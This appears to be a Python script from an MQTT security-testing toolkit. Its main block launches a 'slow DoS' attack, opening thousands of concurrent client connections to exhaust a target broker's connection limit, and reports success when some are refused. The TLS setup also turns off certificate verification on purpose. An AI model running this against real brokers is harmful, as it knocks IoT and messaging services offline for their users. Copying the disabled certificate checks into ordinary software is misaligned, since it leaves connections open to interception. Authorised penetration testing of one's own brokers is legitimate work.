import ssl
import time

import paho.mqtt.client as mqtt
from paho.mqtt.packettypes import PacketTypes
from paho.mqtt.properties import Properties

import CONST

ip_target_const = CONST.IP_ADDRESS
port_const = CONST.DST_PORT
version_const = mqtt.CallbackAPIVersion.VERSION2
connected = 0
slow_connection_difference = 0
publish_times = []
slow_connections = 3000


# 与嗅探攻击保持一致
class Credentials:
    def __init__(self):
        # boolean flag used to check if the object is empty or not
        self.empty = True
        self.clientID = None
        self.username = None
        self.password = None

    def add_clientID(self, clientID):
        self.empty = False
        self.clientID = clientID

    def add_username(self, username):
        self.empty = False
        self.username = username

    def add_password(self, password):
        self.empty = False
        self.password = password


def on_connect_3(client, userdata, flags, rc):
    """
    连接回调函数，当客户端连接成功时被调用
    """
    global connected
    w = userdata.get("on_connect_received", None)
    if w is not None:
        userdata["on_connect_received"] += 1
    client.user_data_set(userdata)
    if rc == 0:
        connected += 1


def on_connect_5(client, userdata, flags, reasonCode, properties):
    """
    连接回调函数，当客户端连接成功时被调用（MQTTv5版本）
    """
    on_connect_3(client, userdata, flags, reasonCode)


def subscribe_callback_3(client, userdata, mid, granted_qos):
    """
    订阅回调函数，当客户端成功订阅主题时被调用
    """
    if userdata.get("on_subscribe_received", None) is not None:
        userdata["on_subscribe_received"] = True
    if userdata.get("test_name", None) is not None and userdata["test_name"] == 'queue' and userdata.get(
            "ready_to_disconnect", None) is not None:
        userdata["ready_to_disconnect"] = True


def subscribe_callback_5(client, userdata, mid, reason_code_list, properties):
    """
    订阅回调函数，当客户端成功订阅主题时被调用（MQTTv5版本）
    """
    subscribe_callback_3(client=client, userdata=userdata, mid=mid, granted_qos=reason_code_list)


def message_callback(client, userdata, message):
    """
    消息回调函数，当客户端接收到消息时被调用
    """
    print(f'received message = <{message}>')

    if userdata.get("received_payload", None) is not None:
        userdata["received_payload"] = True

    if userdata.get("ready_to_disconnect", None) is not None and userdata["ready_to_disconnect"]:
        client.disconnect()
        client.loop_stop()
    else:
        if userdata.get("received_msg", None) is not None:
            userdata["received_msg"] += 1


def publish_callback_5(client, userdata, mid, reason_code, properties):
    """
    发布回调函数，当消息成功发布时被调用（MQTTv5版本）
    """
    publish_callback_3(client=client, userdata=userdata, mid=mid)


def publish_callback_3(client, userdata, mid):
    """
    发布回调函数，当消息成功发布时被调用
    """
    global publish_times
    if userdata.get("test_name", None) is not None and userdata["test_name"] == "avg_publish_time":
        if userdata["pre_publish"] is not None:
            publish_times.append((time.time() * 1000) - userdata["pre_publish"])
    elif userdata.get("test_name", None) is not None and userdata["test_name"] == "queue" and userdata.get(
            "published_msg", None) is not None and userdata.get("on_publish_received", None) is not None:
        userdata["on_publish_received"] = True
        userdata["published_msg"] += 1


def set_callbacks_and_parameters(client, test_name, credentials, cert_key_paths, version):
    """
    设置回调函数和参数
    """
    # Set username, password, and eventually the certificate and keys (only the clientID must be unique)
    if not credentials.empty:
        client.username_pw_set(credentials.username, credentials.password)
    if cert_key_paths[0] is not None:
        client.tls_set(cert_key_paths[0], cert_key_paths[1], cert_key_paths[2], ssl.CERT_NONE,
                       tls_version=ssl.PROTOCOL_TLS, ciphers=None)
        client.tls_insecure_set(True)  # allow to test scenarios with self-signed certificates
    if version == mqtt.CallbackAPIVersion.VERSION2:
        client.on_connect = on_connect_5
        client.on_publish = publish_callback_5
        client.on_subscribe = subscribe_callback_5
    else:
        client.on_connect = on_connect_3
        client.on_publish = publish_callback_3
        client.on_subscribe = subscribe_callback_3

    client.on_message = message_callback
    user_data_dict = {
        "test_name": test_name,
        "on_connect_received": False,
        "on_subscribe_received": False,
        "on_publish_received": False,
        "received_msg": 0,
        "published_msg": 0,
        "ready_to_disconnect": False,
        "received_payload": False
    }
    client.user_data_set(user_data_dict)


def gen_connect_properties():
    """
    生成连接属性
    """
    connect_properties = Properties(PacketTypes.CONNECT)
    connect_properties.SessionExpiryInterval = 86400  # 0x11 - 1 day
    return connect_properties


def init_client(host, version, port, keepalive, test_name, client_id, clean, credentials, cert_key_paths):
    """
    初始化客户端
    """
    if version == mqtt.CallbackAPIVersion.VERSION2:
        client = mqtt.Client(callback_api_version=version, client_id=client_id, protocol=mqtt.MQTTv5)
        set_callbacks_and_parameters(client, test_name, credentials, cert_key_paths, version)
        if test_name == "slow_dos":
            client.connect_async(host, port, keepalive, clean_start=clean, properties=gen_connect_properties())
        else:
            client.connect(host, port, keepalive, clean_start=clean, properties=gen_connect_properties())
    else:
        client = mqtt.Client(callback_api_version=version, client_id=client_id, clean_session=clean,
                             protocol=mqtt.MQTTv311)
        set_callbacks_and_parameters(client, test_name, credentials, cert_key_paths, version)
        if test_name == "slow_dos":
            client.connect_async(host, port, keepalive)
        else:
            client.connect(host, port, keepalive)

    client.loop_start()
    return client


def slow_dos(host, version, port, credentials, cert_key_paths, max_connections, wait_time):
    global connected
    global slow_connection_difference
    connected = 0  # reset the connected counter
    # mqtt_clients = [] #Used to disconnect clients

    for x in range(max_connections):
        init_client(host, version, port, wait_time, "slow_dos", "Client_slow_ " + str(x), True, credentials,
                    cert_key_paths)
        # time.sleep(.1) #Avoids socket error with many connections (e.g., over 8k)

    # Wait for all clients connections or X seconds timeout
    try:
        print(str(wait_time // 60) + " minutes timeout for slow DoS (press ctrl+c once to skip):")
        for x in range(wait_time):
            if max_connections - connected == 0:
                print("All " + str(max_connections) + " connections succeeded")
                break
            else:
                if x % 60 == 0:
                    print(str((wait_time - x) // 60) + " minutes remaining")
                time.sleep(1)
    except KeyboardInterrupt:
        pass

    # Disconnect all clients #Commented out to save time (not really necessary)
    # for client in mqtt_clients:
    #    client.loop_stop()
    #    client.disconnect()

    slow_connection_difference = max_connections - connected

    # If not all clients managed to connect DoS is successful
    if connected > 0 and slow_connection_difference != 0:
        print("Slow DoS successful, max connections allowed: " + str(connected))
        return True
    else:
        return False


if __name__ == '__main__':
    credentials = Credentials()
    cert_key_paths = [None, None, None]
    timew = (int(slow_connections * 0.04)) if (slow_connections * 0.04 > 60) else 60
    res2 = slow_dos(ip_target_const, version_const, port_const, credentials, cert_key_paths, slow_connections, timew)
